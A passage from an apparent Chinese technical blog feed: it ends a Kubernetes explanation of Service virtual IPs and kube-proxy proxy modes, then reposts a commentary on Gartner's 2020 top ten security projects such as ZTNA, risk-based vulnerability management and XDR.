），但当前 API 是强制要求的。</p><p>虚拟IP实施<br>对很多想使用 Service 的人来说，前面的信息应该足够了。 然而，有很多内部原理性的内容，还是值去理解的。</p><p>避免冲突<br>Kubernetes 最主要的哲学之一，是用户不应该暴露那些能够导致他们操作失败、但又不是他们的过错的场景。 对于 Service 资源的设计，这意味着如果用户的选择有可能与他人冲突，那就不要让用户自行选择端口号。 这是一个隔离性的失败。</p><p>为了使用户能够为他们的 Service 选择一个端口号，我们必须确保不能有2个 Service 发生冲突。 Kubernetes 通过为每个 Service 分配它们自己的 IP 地址来实现。</p><p>为了保证每个 Service 被分配到一个唯一的 IP，需要一个内部的分配器能够原子地更新 etcd 中的一个全局分配映射表， 这个更新操作要先于创建每一个 Service。 为了使 Service 能够获取到 IP，这个映射表对象必须在注册中心存在， 否则创建 Service 将会失败，指示一个 IP 不能被分配。</p><p>在控制平面中，一个后台 Controller 的职责是创建映射表 （需要支持从使用了内存锁的 Kubernetes 的旧版本迁移过来）。 同时 Kubernetes 会通过控制器检查不合理的分配（如管理员干预导致的） 以及清理已被分配但不再被任何 Service 使用的 IP 地址。</p><p>Service IP 地址<br>不像 Pod 的 IP 地址，它实际路由到一个固定的目的地，Service 的 IP 实际上 不能通过单个主机来进行应答。 相反，我们使用 iptables（Linux 中的数据包处理逻辑）来定义一个 虚拟 IP 地址（VIP），它可以根据需要透明地进行重定向。 当客户端连接到 VIP 时，它们的流量会自动地传输到一个合适的 Endpoint。 环境变量和 DNS，实际上会根据 Service 的 VIP 和端口来进行填充。</p><p>kube-proxy支持三种代理模式: 用户空间，iptables和IPVS；它们各自的操作略有不同。</p><h4 id="Userspace"><a href="#Userspace" class="headerlink" title="Userspace"></a>Userspace</h4><p>作为一个例子，考虑前面提到的图片处理应用程序。 当创建后端 Service 时，Kubernetes master 会给它指派一个虚拟 IP 地址，比如 10.0.0.1。 假设 Service 的端口是 1234，该 Service 会被集群中所有的 kube-proxy 实例观察到。 当代理看到一个新的 Service， 它会打开一个新的端口，建立一个从该 VIP 重定向到 新端口的 iptables，并开始接收请求连接。</p><p>当一个客户端连接到一个 VIP，iptables 规则开始起作用，它会重定向该数据包到 “服务代理” 的端口。 “服务代理” 选择一个后端，并将客户端的流量代理到后端上。</p><p>这意味着 Service 的所有者能够选择任何他们想使用的端口，而不存在冲突的风险。 客户端可以连接到一个 IP 和端口，而不需要知道实际访问了哪些 Pod。</p><h4 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h4><p>再次考虑前面提到的图片处理应用程序。 当创建后端 Service 时，Kubernetes 控制面板会给它指派一个虚拟 IP 地址，比如 10.0.0.1。 假设 Service 的端口是 1234，该 Service 会被集群中所有的 kube-proxy 实例观察到。 当代理看到一个新的 Service， 它会配置一系列的 iptables 规则，从 VIP 重定向到每个 Service 规则。 该特定于服务的规则连接到特定于 Endpoint 的规则，而后者会重定向（目标地址转译）到后端。</p><p>当客户端连接到一个 VIP，iptables 规则开始起作用。一个后端会被选择（或者根据会话亲和性，或者随机）， 数据包被重定向到这个后端。 不像用户空间代理，数据包从来不拷贝到用户空间，kube-proxy 不是必须为该 VIP 工作而运行， 并且客户端 IP 是不可更改的。</p><p>当流量打到 Node 的端口上，或通过负载均衡器，会执行相同的基本流程， 但是在那些案例中客户端 IP 是可以更改的。</p><h4 id="IPVS"><a href="#IPVS" class="headerlink" title="IPVS"></a>IPVS</h4><p>在大规模集群（例如 10000 个服务）中，iptables 操作会显着降低速度。 IPVS 专为负载平衡而设计，并基于内核内哈希表。 因此，你可以通过基于 IPVS 的 kube-proxy 在大量服务中实现性能一致性。 同时，基于 IPVS 的 kube-proxy 具有更复杂的负载均衡算法（最小连接、局部性、 加权、持久性）。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> K8S </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gartner2020年十大安全项目详解</title>
      <link href="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/"/>
      <url>/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <p>转自：<br><a href="https://blog.51cto.com/yepeng">叶蓬</a>2020-10-28 10:03:04博主文章分类：<a href="https://blog.51cto.com/yepeng/category10">Cybersecurity</a>©著作权<p></p><p><strong><em>文章标签</em><a href="https://blog.51cto.com/topic/gartner.html">Gartner</a><a href="https://blog.51cto.com/topic/shidaanquanxiangmu.html">十大安全项目</a><a href="https://blog.51cto.com/topic/xdr.html">XDR</a><a href="https://blog.51cto.com/topic/lingxinren.html">零信任</a><a href="https://blog.51cto.com/topic/ruodianguanli.html">弱点管理</a><strong><strong><em>文章分类</em><a href="https://blog.51cto.com/nav/sec">网络/安全</a><a href="https://blog.51cto.com/nav/safety-technology">安全技术</a></strong></strong><em>阅读数</em><strong>4707</strong></strong></p><p>【前言】本文不是译文，是结合笔者自身体会的解读！不能代表Gartner的本意。如有不同观点，欢迎交流研讨。本文最初发布于个人微信“专注安管平台”上，发表于此时进行了修订，并增加了大量受限于微信而无法保留的网页链接。</p><p>1     概述</p><p>受疫情的影响，2020年中例行的Gartner安全与风险管理峰会被迫取消。终于，在2020年9月14~17日，2020年Gartner安全风险与管理峰会以线上会议的形式补上了。</p><p>会上，正式发布了<a href="https://www.gartner.com/smarterwithgartner/gartner-top-security-projects-for-2020-2021/"> 2020年度的十大安全项目</a>，发布人还是Brian Reed。</p><p>2020年的十大安全项目分别是：</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849467473611.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849467473611.png"></a></p><p>1)       远程员工安全防护，尤指零信任网络访问（ZTNA）技术；</p><p>2)       基于风险的弱点管理，重点是基于风险来对弱点分级；</p><p>3)       基于平台方式的检测与响应，特指扩展检测与响应（XDR）技术；</p><p>4)       云安全配置管理；</p><p>5)       简化云访问控制，特指云访问安全代|理（CASB）技术；</p><p>6)       基于DMARC协议的邮件安全防护；</p><p>7)       无口令认证；</p><p>8)       数据分类与保护；</p><p>9)       员工胜任力评估；</p><p>10)   安全风险评估自动化。</p><p>与2019年度的10大安全项目相比，变化比较大，根据Reed的说法，有8个新项目。</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849506260932.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849506260932.png"></a></p><p>不过，在笔者看来，其实有三个2019年的热门项目保留了下来，包括 CSPM、CASB，以及弱点管理。其中CSPM项目名称保持不变，2019年的CASB变成了今年的“简化云访问控制”，其实是一回事。而2019年的“符合CARTA的弱点管理”变成了今年的“基于风险的弱点管理”，其实是进一步确指了用风险管理的理念来管理漏洞和补丁。在2019年十大安全项目详解中，笔者已经指出“符合CARTA的弱点管理”等价于“基于风险的弱点管理”。</p><p>需要特别指出的是，由于新冠疫情的出现，不仅此次Gartner安全与风险管理被迫延期并改为线上举办，也对2020年的十大安全项目评选产生了重大影响。疫情侵袭之下，远程办公成为热点，如何保障员工远程办公的安全自然成为焦点。</p><p>此外，从技术的大类来看，好几个领域依然是热门，包括邮件安全、检测与响应、数据安全。</p><p>邮件安全领域，2019年提出的项目是商业邮件失陷防护，2020年变成了基于DMARC协议的邮件安全防护，其主要目标依然是防范钓鱼邮件。</p><p>检测与响应领域，2019年主要是推荐EDR，2020年则改为推荐XDR。</p><p>数据安全领域，2019年推荐的是暗数据发现，2020年换成了数据分类与防护，其实是数据安全生命周期的延续。</p><p>下表是笔者梳理的近几年10大技术/项目的分类对比。为了便于横向对比，尽可能地对各个技术领域进行了分拆。</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849542983920.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849542983920.png"></a></p><p>需要进一步指出地是，在2020年的十大项目中特别增加了风险管理领域的项目，包括安全风险评估自动化以及员工胜任力评估。风险管理领域一直十分重要，只是在近些年越来越强调对抗，强调threat检测的背景下不那么显眼了。</p><p>此外，在2020年5月初，Gartner先期发布过<a href="https://mp.weixin.qq.com/s?__biz=MzUyNzMxOTAwMw==&mid=2247484140&idx=1&sn=1105fa84d9caec3938d6b4d0285f0648&chksm=fa002858cd77a14ec627e6960b895ec729e5c100820c9c5a388ddb60c3d6882bfd18a78bfc32&token=766021203&lang=zh_CN#rd"> 针对中型企业的5大安全项目</a>建议，包括：XDR、基于DMARC的邮件安全、无口令认证、远程员工安全，以及安全风险评估自动化。而这其中列举的5个项目全部入选了年度10大安全项目。</p><p>2     入选标准</p><p>除了像往年一样的基本标准和原则，对于2020年的十大安全项目遴选，Gartner重点做了以下考量：</p><p>1）           疫情影响下的安全支出变化情况；</p><p>2）           观察2018~2023年间最终用户在不同安全细分领域支出的计划情况；</p><p>3）           重点关注那些占比和增速大的区域市场情况；</p><p>Reed在峰会的十大安全项目发布会上表示：“我们可能会花费太多宝贵的时间来过度分析自己在安全性方面所做的选择，试图实现某种根本不存在的完美保护战略。我们必须超越基本的保护决策，通过创新的方法进行检测和响应，并最终从安全事件中恢复，从而提升组织的弹性。”</p><p>最后，谨记：年度十大安全项目不是年度最酷安全项目，也不是未来十大技术趋势，而是在当年对最终用户而言，从那些如果不做会对业务影响性最大，如果做了会将业务风险降到最低的项目候选清单中选取的能够快速见效，花费相对可控的项目。</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849561775873.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849561775873.png"></a></p><p>3     如何定义项目成功与否？</p><p>Gartner表示，衡量项目是否成功不在于项目本身，而在于是否支撑好了业务的风险决策。原话说的很好，这里直接摘录如下：</p><p>Remember your organization decides whether to take on the risk; our job in security is to provide all known data points to support a business decision.</p><p>4     上马这些项目的前提条件</p><p>一如既往地，Gartner特别强调，客户在考虑上马10大项目之前，一定要考虑到先期的基础安全建设，这些项目都需要建构在基础安全能力达标的情况下。这些基础安全能力包括（但不限于）：</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849590493918.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849590493918.png"></a></p><p>1)       在系统防护方面，包括采用最新的EPP和统一端点管理（Unified Endpoint Management，简称UEM）系统，以及服务器安全防护。其中，这里提到的UEM是Gartner定义的区分于EPP的另一个细分市场，强调对包括异构的PC、移动端和物联网终端的统一管理。该市场不属于信息安全市场，而归属于IT运维管理市场。2018年Gartner首次推出了UEM的MQ（魔力象限）。</p><p>2)       在用户控制方面，包括从windows用户列表中移除掉管理员权限，部署具有自动化预配置/解除配置的IAM。</p><p>3)       在基础设施安全方面，包括日志监控、备份/恢复能力、补丁和基本的弱点管理，以及各种边界安全控制。</p><p>4)       在信息处理方面，包括邮件安全控制、安全意识培训、敏感数据处理相关的控制和指引、风险评估等。</p><p>5     十大项目解析</p><p>以下逐一分析这十个项目，对于历年分析过的也一并再次分析。<strong>Gartner特别强调，这十个项目并没有优先顺序，采纳者需要根据自身风险的实际情况按需选取</strong>。</p><h2 id="5-1-远程员工安全防护项目"><a href="#5-1-远程员工安全防护项目" class="headerlink" title="5.1    远程员工安全防护项目"></a>5.1    远程员工安全防护项目</h2><h3 id="5-1-1-项目描述"><a href="#5-1-1-项目描述" class="headerlink" title="5.1.1     项目描述"></a>5.1.1     项目描述</h3><p>员工远程办公已经成为2020年的新常态。可以利用零信任战略在使能业务的同时改善远程员工接入网络的安全性。</p><h3 id="5-1-2-项目难度"><a href="#5-1-2-项目难度" class="headerlink" title="5.1.2     项目难度"></a>5.1.2     项目难度</h3><p>容易到中等。必须兼顾连接性、生产力和可度量性。</p><h3 id="5-1-3-项目关键"><a href="#5-1-3-项目关键" class="headerlink" title="5.1.3     项目关键"></a>5.1.3     项目关键</h3><p>安全访问能力必须支持云；IP地址和位置信息已经不足以用于判定网络访问的信任度。</p><h3 id="5-1-4-项目建议"><a href="#5-1-4-项目建议" class="headerlink" title="5.1.4     项目建议"></a>5.1.4     项目建议</h3><p>尽管采用零信任网络访问（ZTNA）的主要动机是取代***，但还要注意到ZTNA还能提供针对非受管设备安全访问应用的解决方案。</p><h3 id="5-1-5-技术成熟度"><a href="#5-1-5-技术成熟度" class="headerlink" title="5.1.5     技术成熟度"></a>5.1.5     技术成熟度</h3><p>根据Gartner2020年的网络安全Hype Cycle，ZTNA目前处于青春期阶段，位于失望的谷底。</p><h3 id="5-1-6-技术描述"><a href="#5-1-6-技术描述" class="headerlink" title="5.1.6     技术描述"></a>5.1.6     技术描述</h3><p>很显然，突如其来的疫情使得员工远程办公迅速扩张，如何保障员工安全地，并且尽可能体验友好地访问企业网络和应用成为了十分急迫的议题。企业和组织的管理者必须制定一个全面的远程办公策略，并且和业务部门进行良好的沟通。</p><p>如何制定策略？首先就要做好需求收集与分析。Gartner提议重点关注4个问题：<br><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849611743817.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849611743817.png"></a></p><p>1）           用户都有谁，他们的工作职责分别是什么？——据此确认不同用户的访问权限和服务优先级；</p><p>2）           用户都使用何种设备，设备归属于谁？——据此选择针对不同设备的安全防护技术组合；</p><p>3）           用户都要访问哪些应用和数据，这些应用和数据位于云中还是本地？——据此选择合适的网络访问技术；</p><p>4）           用户位于哪个地区？——根据用户所在国家（地区）采取相适应的数据安全、隐私保护和法规遵从性等策略。</p><p>事实上，针对远程网络访问，有多种技术手段可供选择，包括***、ZTNA、CASB、VDI、远程浏览器隔离、反向代|理、CDN，等等。它们之间不是简单的替代关系，而是各有用途及适合的使用场景。Gartner在该项目中优先推荐采用零信任理念和零信任网络访问（ZTNA）技术，从而间接使得该项目变成了一个ZTNA项目。Gartner针对本项目推介的样本厂商都是ZTNA厂商，并且主要是基于云的ZTNA厂商。</p><p>Gartner对零信任的定义参考了《NIST SP800-207零信任架构》中的定义，并提出了“零信任网络”的概念。Gartner认为，<strong>零信任是一种安全范式，它根据情境信息（主要是身份信息）持续评估显式的风险及信任级别，替代原有的隐式信任机制，以适应组织安全形势的风险优化</strong>。同时，Gartner认为零信任网络由建立在资产管理和访问管理基础上的三个支柱构成，这三个支柱分别是ZTNA、网络访问控制（NAC）和基于身份的隔离（即之前所称的微隔离）。</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849631135937.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849631135937.png"></a></p><p><strong>Gartner****将零信任网络访问（ZTNA）定义为一类产品和服务。这些产品和服务创建了基于身份和情境的逻辑访问边界，涵盖用户、一个应用或一组应用程序。这些应用程序（在获得授权之前）被隐藏起来从而无法被发现，只能严格通过信任代|理来建立连接和实现访问。代|理在允许主体访问之前先验证其身份、情境和策略遵从情况（即先验证再访问），并最小化该主体在网络中向其他位置横向移动的可能性。</strong></p><p>在Gartner看来，ZTNA未来将成为SASE战略的一部分，与CASB等安全技术一道被SD-WAN封装到边缘计算的安全能力集合中。在Sec-UN上的《<a href="https://www.sec-un.org/%E6%97%A0sd-wan%E4%B8%8Dsase/"> 无SD-WAN不SASE</a>》一文有一幅形象的图展示了SASE的部署架构，如下所示：</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849647199396.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849647199396.png"></a></p><h2 id="5-2-基于风险的弱点管理项目"><a href="#5-2-基于风险的弱点管理项目" class="headerlink" title="5.2    基于风险的弱点管理项目"></a>5.2    基于风险的弱点管理项目</h2><h3 id="5-2-1-项目描述"><a href="#5-2-1-项目描述" class="headerlink" title="5.2.1     项目描述"></a>5.2.1     项目描述</h3><p>弱点管理是安全运营的基本组成部分。补丁从来都不能等同对待，应该通过基于风险优先级的管理方式，找到优先需要处理的弱点并进行补丁管理，从而显著降低风险。</p><h3 id="5-2-2-项目难度"><a href="#5-2-2-项目难度" class="headerlink" title="5.2.2     项目难度"></a>5.2.2     项目难度</h3><p>容易。要利用情境数据和threat情报对弱点信息进行丰富化。</p><h3 id="5-2-3-项目关键"><a href="#5-2-3-项目关键" class="headerlink" title="5.2.3     项目关键"></a>5.2.3     项目关键</h3><p>要意识到永不可能100%打补丁；和IT运维联合行动（创造双赢）；利用现有的扫描数据和流程；用TVM工具（现在改称VPT）来增强弱点评估以更好确定优先级。</p><h3 id="5-2-4-项目建议"><a href="#5-2-4-项目建议" class="headerlink" title="5.2.4     项目建议"></a>5.2.4     项目建议</h3><p>采用一个通用的弱点管理框架；聚焦在可被利用的弱点上。</p><h3 id="5-2-5-技术成熟度"><a href="#5-2-5-技术成熟度" class="headerlink" title="5.2.5     技术成熟度"></a>5.2.5     技术成熟度</h3><p>Gartner没有将基于风险的弱点管理列为一种独立的技术或者市场，而是看作一个迭代管理过程，将其依附于现有的弱点评估（VA）市场和弱点优先级划分技术（VPT）。然而，笔者认为Gartner搞得太复杂了，基于风险的弱点管理应该与VPT合并。根据2020年的安全运营Hype Cycle，VA已经处于成熟期，属于主流市场；而VPT位于曲线的顶峰，属于热门技术，处于青春期阶段。</p><h3 id="5-2-6-技术解析"><a href="#5-2-6-技术解析" class="headerlink" title="5.2.6     技术解析"></a>5.2.6     技术解析</h3><p><strong>必须注意，弱点管理不是弱点评估</strong>。弱点评估对应我们熟知的弱点扫描工具，包括系统漏扫、web漏扫、配置核查、代码扫描等。而弱点管理是在弱点评估工具之上，收集这些工具所产生的各类弱点数据，进行集中整理分析，并辅以情境数据（譬如资产、threat、情报等），进行风险评估，按照风险优先级处置弱点（打补丁、缓解、转移、接受，等），从而帮助安全管理人员进行弱点全生命周期管理的平台。记住，弱点管理是平台，而弱点扫描是工具。</p><p><strong>Gartner****表示，基于风险的弱点管理是一个不断迭代提升的过程，包括弱点评估、弱点处置优先级排序、弱点补偿控制三个阶段</strong>，如下图所示：<br><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849664572614.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849664572614.png"></a></p><p>上图针对每个阶段列举了可以用到的技术。譬如动态应用安全测试（DAST）、云安全配置评估（CSPA）、破坏与攻|击模拟（BAS）、弱点优先级划分技术（VPT，取代之前的TVM）、应用弱点关联（AVC）、安全编排自动化与响应（SOAR）。</p><p>而<strong>基于风险的弱点管理的核心是弱点处置优先级确定</strong>。可以采用多种方式去确定这个优先级，但最关键的一点是：<strong>聚焦在可被利用的漏洞上</strong>。</p><p>下图是Gartner引述IBM X-Force的一个统计图。<br><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849679363944.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849679363944.png"></a></p><p>可以看到，历史上可被利用的漏洞占爆出的漏洞的比重还是很低的。</p><p>下面这个老图也很有说服力。这个图表明用户首先需要关注的是那些实际存在于你的网络环境中的可被利用的漏洞。</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849687135281.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849687135281.png"></a></p><p>现实已经表明，漏洞太多了，层出不穷，如果每个重要的（譬如依据CVSS）漏洞都要去处理，是不现实的，应该首先聚焦在可被利用的漏洞上。进一步讲，你如何知道一个漏洞是否已经可被利用？这时候就需要漏洞情报，不是关于漏洞自身的情况，而是关于漏洞利用（EXP）和漏洞证明（POC）的情报。</p><p>在基于风险的弱点管理方法论中，补偿阶段也很重要。最关键的是要意识打补丁（Patch）仅仅是N分之一个选择项，你还有大量手段可以用。事实上，大量的业务系统留给你足的够时间直接打补丁的机会并不大。</p><p>这里，笔者对于如何在补丁管理这个事情上取得与IT运维的双赢也有一些建议：安全运营在弱点管理的时候要给到IT运维足够的信息和建议去指导他/她打补丁，而不仅仅是一个告警/工单或者甩过去一个补丁包。这时候Gartner的那句话再次回响：Remember your organization decides whether to take on the risk; our job in security is to provide all known data points to support a business decision. 谨记，要让漏洞管理闭环，需要安全运营与IT运营共同协作，需要业务部门的参与。作为安全运营，要把自己的工作做好，做到有价值。</p><h2 id="5-3-平台方式的检测与响应（XDR）项目"><a href="#5-3-平台方式的检测与响应（XDR）项目" class="headerlink" title="5.3    平台方式的检测与响应（XDR）项目"></a>5.3    平台方式的检测与响应（XDR）项目</h2><h3 id="5-3-1-项目描述"><a href="#5-3-1-项目描述" class="headerlink" title="5.3.1     项目描述"></a>5.3.1     项目描述</h3><p>扩展检测与响应（XDR）功能正在涌现，以提升检测的准确性、threat遏制能力并改善事件管理。</p><h3 id="5-3-2-项目难度"><a href="#5-3-2-项目难度" class="headerlink" title="5.3.2     项目难度"></a>5.3.2     项目难度</h3><p>中等。XDR给到大家的是一个重要的承诺，但也会带来被特定供应商锁定的风险。不同供应商的XDR功能差异很大。</p><h3 id="5-3-3-项目关键"><a href="#5-3-3-项目关键" class="headerlink" title="5.3.3     项目关键"></a>5.3.3     项目关键</h3><p>范化数据的集中存储和集中式事件响应，并且能够改变作为修复过程组成部分的单个安全产品的状态。也就是说，项目关键在于数据范化、集中数据存储、集中事件响应，以及安全设备协同联动。</p><h3 id="5-3-4-项目建议"><a href="#5-3-4-项目建议" class="headerlink" title="5.3.4     项目建议"></a>5.3.4     项目建议</h3><p>基于自身技能水平/胜任力以及员工水平来评估是采用XDR还是寻求MSSP。XDR最初是从EDR发展而来，并进一步结合了NDR、SIEM、SOAR，以及其它安全检测与响应技术，这些技术统统都是高度依赖安全专家的，因此，用户要考虑清楚到底是要XDR产品，还是先找安全服务商用类似MDR的方式来实现检测与响应。</p><h3 id="5-3-5-技术成熟度"><a href="#5-3-5-技术成熟度" class="headerlink" title="5.3.5     技术成熟度"></a>5.3.5     技术成熟度</h3><p>根据Gartner2020年的安全运营Hype Cycle，XDR目前处于初现阶段，位于炒作的初期，位于安全运营Hype Cycle的最左侧。</p><h3 id="5-3-6-技术解析"><a href="#5-3-6-技术解析" class="headerlink" title="5.3.6     技术解析"></a>5.3.6     技术解析</h3><p>XDR的全称是扩展检测与响应。XDR这个词出现在厂商侧已经有一段时间了，但纳入Gartner的体系是今年初的事儿。Gartner将XDR从某些厂商的产品品牌变成了一个细分技术和市场术语。刚刚进入Gartner的术语表就登上了10大安全项目，可见XDR的威力。</p><p>借助XDR，将原本各种检测系统的孤立告警进行了整合，通过在各种检测系统之上的数据集成与综合关联分析，呈现给用户更加精准和有价值的告警，以及更清晰的可见性（Visibility）。此外，XDR还具备与单一的安全工具之间的API对接与基础的编排能力，从而能够快速地实施告警响应与threat缓解。</p><p>XDR异军突起，成为了Gartner在安全运营的检测与响应子领域首推的技术和项目，因此有必要进一步对其进行探究。笔者作为一直专注于SIEM/SOC领域的从业者也关注XDR近两年，下面进一步阐述个人对XDR的理解。</p><h4 id="5-3-6-1-XDR的产生"><a href="#5-3-6-1-XDR的产生" class="headerlink" title="5.3.6.1   XDR的产生"></a>5.3.6.1   XDR的产生</h4><p>现在普遍认为XDR最早源于端点检测与响应（EDR）。EDR的概念自提出以来，得到了迅速发展，一方面逐渐向端点保护平台EPP融合，另一方面也在试图扩展自身的价值。如何扩展？首先是增强端点检测的能力，深化诸如行为分析、异常检测等的机器学习能力，并加入threat猎捕的能力；其次是增强响应的能力，实现更灵活的设备联动，甚至嵌入部分响应流程。但这还不够，因为从检测的角度来看，仅仅依靠端点自身的遥测数据还不够，为了更精准的发现问题，还需要获取其它遥测数据。因此，部分EDR厂商开始将目光投向端点之外的检测，加入对邮件安全的检测、网络检测、以及云工作负载的检测信息，试图顺着攻|击者的视角补全检测的短板。再往后干脆将这些不同来源的遥测数据放到一个统一的平台上进行集中的分析与响应，逐步衍生出了XDR的概念。此时XDR的保护目标已经不再局限于端点上的用户，以及他们使用的应用和数据，而是扩展到了更广泛的空间，从数据中心，到云，再到边缘，都可以应用XDR。当EDR演进成了XDR，就已经不再是一个端点安全类产品了。</p><p>显然，这是一个从EDR开始，从一点到多点，自底向上的横向扩展，纵向延伸的过程。</p><p>与此同时，一些SIEM厂商也发现了这个机会，试图在其SIEM中内置EDR功能来获取对于端点安全的遥测数据，以更好地去让SIEM实现threat检测的能力。这是一个自顶向下延伸的过程。</p><p>基于共同的目标（threat检测与响应），来自不同方向的技术路线碰撞到了一起，于是XDR诞生了。</p><h4 id="5-3-6-2-XDR定义"><a href="#5-3-6-2-XDR定义" class="headerlink" title="5.3.6.2   XDR定义"></a>5.3.6.2   XDR定义</h4><p>从前面的XDR产生过程可以发现，XDR其实就是整合了多种检测能力的，具有集中化存储和分析这些遥测数据，并集中实施响应的综合性检测与响应平台。</p><p>目前，Gartner给XDR的定义是：<strong>XDR是一种基于SaaS的，绑定到特定供应商的安全threat检测和事件响应工具，可以将（该供应商的）多个安全产品原生地集成到一个统一的安全运行系统中，以统一所有授权的安全组件</strong>。为了方便大家研读，提供英文原文如下：XDR is a SaaS-based, vendor-specific, security threat detection and incident response tool that natively integrates multiple security products into a cohesive security operations system that unifies all licensed security components.</p><p>Gartner给出了当前XDR的4个基本特征：1）整合多款自家的现成产品；2）集中的对数据进行处理、存储和分析；3）能够在响应的时候协同联动多种安全产品；4）采用基于SaaS的交付模式。<br><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849703901467.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849703901467.png"></a></p><p>上图展示了Gartner的XDR概念架构。从上向下看【笔者注：反的，有点别扭】，首先是获取多种安全产品（EDR是基础）的数据，然后是对数据进行范化，送入大数据湖，再进行关联分析，实现综合threat检测，最后激活响应。在响应的时候，可以运用自动化的方式，通过API接口实施，并且可以内嵌响应工作流程。</p><p>作为参考，笔者摘录对XDR颇有研究的咨询公司ESG对XDR的定义如下：<strong>XDR是一个跨混合IT架构的多个安全产品的集成套件，旨在协同地进行threat防范、检测与响应。它将各种控制点、安全遥测点、分析和运营统一到一个企业级系统之中。</strong></p><p><a 